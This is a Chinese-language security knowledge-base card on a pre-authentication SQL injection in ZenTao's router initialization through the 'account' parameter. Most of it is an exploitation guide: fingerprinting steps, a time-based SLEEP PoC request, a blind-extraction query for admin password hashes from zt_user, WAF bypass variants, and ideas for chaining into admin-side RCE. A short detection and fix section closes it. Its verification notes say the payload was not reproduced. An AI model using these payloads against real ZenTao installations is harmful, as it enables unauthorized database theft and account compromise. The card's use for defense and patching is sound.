---
id: web-generic-sqli-zentao-router-setversion-account-preath
title: 禅道 baseRouter::setVersion 未过滤 account 直接拼 SQL：index.php 初始化阶段即可未授权注入
type: scenario
domain: web
path: web/generic/sqli
technique: zentao-router-setversion-account-sqli
tags:
- php
- zentao
- mysql
- sqli
- preauth
- router
- time-blind
cve: []
severity: high
confidence: high
affected_versions: 禅道 18.x–20.x（原文标题标注的分析范围）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:48:35+08:00'
  notes: 已对照原文核对：account 参数在 baseRouter 初始化/路由阶段被直接拼进 SQL（原文记作 setVision/setVersion）、延时 payload 与「无需 cookie 即可触发」的论据均来自正文；本次核对未读取图片，setVersion 拼接 SQL 的代码截图（img/07）未核实，注入点位于鉴权之前的结论系原文文字推论；未复现原文 payload。
url: /docs/web/generic/sqli/web-generic-sqli-zentao-router-setversion-account-preath/
draft: false
kb_aliases:
- 禅道 setVersion SQL 注入
- ZenTao account 参数注入
- 禅道路由初始化注入
- 禅道未授权 SQL 注入
---

## 一句话结论

禅道的 `baseRouter::setVersion()` 把请求里的 `account` 参数直接拼进一条 SQL 语句并执行，而该函数在 `index.php` 构造路由对象时就会被调用（远早于鉴权），因此任何未认证访问者只要带上 `account=admin' AND (SELECT ... SLEEP(5))-- b` 就能做时间盲注拖库，无需登录、无需任何前置漏洞。

## 原理

- 禅道的入口（`index.php`/`api.php`/`x.php`）统一走 `router::createApp()` → `baseRouter::__construct()`，构造函数里依次做路径、配置、类加载等初始化，其中会调用 `setVersion()` 读取/写入版本信息。
- `setVersion()` 用 `$account` 变量拼 SQL，而 `$account` 来自请求参数（GET/POST 的 `account`），既没有走 `dao` 的参数绑定，也没有做 `escape`，于是单引号即可闭合字符串进入注入。
- **未授权的原因**：注入点位于路由初始化流程，在 `$app->parseRequest()`、`$common->checkPriv()` 之前；鉴权发生在 `commonModel::checkPriv` 之后，所以这条路径根本走不到权限检查。
- 可注入意味着可以布尔/时间盲注读取 `zt_user`、`zt_config` 等表；原文用 `SLEEP(5)` 的延时确认。
- 附带价值：同一 `setVersion` 逻辑还会在后续请求中被复用，因此注入点不是一次性，可在会话前后反复利用。

## 触发条件

- 目标为受影响版本的禅道（原文分析范围为 18.x–20.x 开源版）。
- Web 入口（`index.php`、`api.php`、`x.php` 任一）可从外部访问。
- 攻击路径不需要登录态；即使有 WAF，也要绕过其对 `account` 参数的关键字检查。

## 利用步骤

1. 确认目标为禅道：访问 `/zentao/` 或 `/index.php`，页面标题/静态资源路径含 zentao 特征。
2. 用延时 payload 验证注入：`GET /?account=admin' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))a)-- b`，观察响应是否稳定延迟约 5 秒。
3. 换成布尔/时间盲注提取数据：把 `SLEEP(5)` 换成 `IF(SUBSTR((SELECT ...),1,1)='a',SLEEP(3),0)`，或用 `SELECT ... FROM zt_user` 逐字符判断。
4. 优先取 `zt_user` 的 `account`/`password`（禅道默认 32 位 md5）与 `zt_config`（可读到开放方法、功能开关等配置），为后续后台利用铺路。
5. 若目标有 WAF，可把 `SLEEP` 拆成 `SLE/**/EP`、大小写混写、或用 `BENCHMARK`/`GET_LOCK` 等价耗时函数。

## PoC

```http
GET /?account=admin' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))a)-- b HTTP/1.1
Host: target
```

```text
判定：响应耗时约 5 秒（基线请求 <1 秒）。
说明：该参数在路由初始化阶段被拼进 SQL，不需要 Cookie/会话。
时间盲注逐字符示例（MySQL）：
/?account=x' AND IF(SUBSTR((SELECT password FROM zt_user WHERE account='admin'),1,1)='0',SLEEP(3),0)-- b
```

## 变体与关联

- 同产品其它 SQL 注入：搜索页 `words` 参数走 `searchTao::getSqlParams()` 拼进 `AGAINST()`/`LIKE`（属已登录前台注入，与本卡未授权预鉴权注入的入口和位置不同）；`convertModel::dbExists()` 把 `$dbName` 拼进 `SHOW DATABASES like '...'`，配合 PDO 多语句可堆叠注入。
- 该注入点的实际价值取决于 MySQL 账号权限：若是普通账号，至少能拖库拿口令哈希；若账号有 FILE 权限，可进一步考虑写文件（受 `secure_file_priv` 限制）。
- 关联：禅道其它后台 RCE/文件操作卡（repo checkConnection 命令注入、ajaxSaveCustomFields 配置写入、client/download 下载写马）；注入拿到的口令哈希可作为这些链的前置凭据。

## 检测与防御

- 修复：`setVersion()` 对 `$account` 使用 `$this->dao->escape()` 或参数绑定；不要把请求参数直接拼进 SQL。
- 统一约束：所有 `$this->dbh->query()` 直拼点改为预处理；禁止 `account` 等路由参数进入 SQL 文本身份判断。
- 检测：请求中出现 `account=` 且值含单引号、`SLEEP(`、`BENCHMARK(`、`AND (SELECT`、`--` 等模式；同一 IP 对 `/?account=` 的高频请求且响应时长异常波动。
- 加固：Web 前置 WAF 对 `account` 参数做引号/函数关键字过滤只能提高成本；核心是代码层修复与最小数据库权限（去掉 FILE、限制库范围）。
